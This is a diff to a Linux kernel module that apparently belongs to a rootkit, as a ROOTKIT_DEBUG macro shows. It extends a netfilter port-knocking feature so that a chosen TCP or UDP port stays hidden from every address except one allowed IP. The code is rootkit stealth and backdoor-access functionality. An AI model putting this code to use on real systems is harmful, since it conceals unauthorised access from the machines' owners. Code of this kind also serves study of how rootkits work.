@@ -5,19 +5,21 @@
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/skbuff.h>
-
 #include <net/icmp.h>
 #include <net/ip.h>
 #include <net/netfilter/ipv4/nf_reject.h>
 
 #include "include.h"
-#include "main.h"
+#include "port_knocking.h"
 
 /* information for netfilter hooks */
 static struct nf_hook_ops hook;
 
 /* the port for which knocking is enabled */
 static unsigned int port;
+
+/* the transport layer protocol being filtered */
+static int protocol;
 
 /* the ip address which is allowed to connect */
 static __u32 ip;
@@ -31,13 +33,19 @@ static __u32 ip;
  */
 static int
 is_port_blocked (struct sk_buff *skb) {
+
 	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
 	struct tcphdr *tcp_header;
 	struct udphdr *udp_header;
 
-	if (ip_header->protocol == 6) {		/* tcp */
+	/* check tree for TCP */
+	if (protocol == PROTO_TCP 
+		&& ip_header->protocol == 6) {
+
+		/* get the tcp header */
 		tcp_header = (struct tcphdr *) skb_transport_header(skb);
 		
+		/* check if the port matches */
 		if(ntohs(tcp_header->dest) == port) {
 			ROOTKIT_DEBUG("Received packet on filtered tcp port %u from IP %pI4.\n",
 				port, &ip_header->saddr);
@@ -56,9 +64,14 @@ is_port_blocked (struct sk_buff *skb) {
 		}
 	}
 
-	if (ip_header->protocol == 17) {	/* udp */
+	/* check tree for UDP */
+	if (protocol == PROTO_UDP
+		&&ip_header->protocol == 17) {
+
+		/* get the udp header */
 		udp_header = (struct udphdr *) skb_transport_header(skb);
-		
+
+		/* check if the port matches */
 		if(ntohs(udp_header->dest) == port) {
 			ROOTKIT_DEBUG("Received packet on filtered udp port %u from IP %pI4.\n",
 				port, &ip_header->saddr);
@@ -106,7 +119,7 @@ knocking_hook (const struct nf_hook_ops *ops,
 		}
 		
 		if(ip_header->protocol == 17) {	/* udp */
-			nf_send_unreach(skb, 3);	/* send icmp port unreachable */
+			nf_send_unreach(skb, 3);		/* send icmp port unreachable */
 		}
 
 		/* we can now safely drop the packet */
@@ -124,7 +137,7 @@ knocking_hook (const struct nf_hook_ops *ops,
 
 /* enable port knocking */
 int
-load_port_knocking (char *ipv4_addr, unsigned int port_number)
+load_port_knocking (char *ipv4_addr, unsigned int port_number, int proto)
 {
 	int ret;
 	u8 tmp[4];
@@ -146,6 +159,9 @@ load_port_knocking (char *ipv4_addr, unsigned int port_number)
 
 	/* copy the port number */
 	port = port_number;
+
+	/* copy the protocol */
+	protocol = proto;
 
 	/* setup everything for the netfilter hook */
 	hook.hook = knocking_hook;		/* our function */
